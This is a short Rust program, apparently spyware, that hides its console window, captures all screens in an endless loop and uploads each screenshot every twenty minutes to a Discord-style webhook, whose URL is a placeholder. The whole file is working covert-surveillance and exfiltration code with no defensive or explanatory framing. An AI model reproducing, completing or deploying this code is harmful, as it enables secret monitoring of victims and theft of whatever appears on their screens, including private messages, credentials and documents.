#![windows_subsystem = "windows"]
use screenshots::Screen;
use reqwest::multipart;
use serde_json::json;
use std::thread;
use std::time::Duration;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    loop {
        let screens = Screen::all().unwrap();
        for screen in screens {
            let image = screen.capture().unwrap();
            let mut buffer = std::io::Cursor::new(Vec::new());
            image.write_to(&mut buffer, image::ImageOutputFormat::Png).unwrap();
            let buffer = buffer.into_inner();
            let part = multipart::Part::bytes(buffer).file_name("live.png");
            let form = multipart::Form::new()
                .part("files[0]", part)
                .text("payload_json", json!({
             "content": "Live!",
             "embeds": [{
                // "title": "Hello, Embed!",
                // "description": "This is an embedded message.",
                "image": {
                    "url": "attachment://live.png"
                }
             }]
         }).to_string());


            let client = reqwest::Client::new();

            let url = "your webhook url";

            let response = client.post(url)
                .multipart(form)
                .send()
                .await;


            println!("response: {:?}", response);
            match response {
                Ok(res) => {
                    if res.status() == reqwest::StatusCode::OK {
                        println!("response: {:?}", res);
                    }
                }
                Err(err) => {
                    println!("Error sending request: {}", err);
                }
            }
        }
        thread::sleep(Duration::from_secs(1200));

    }
    Ok(())
}
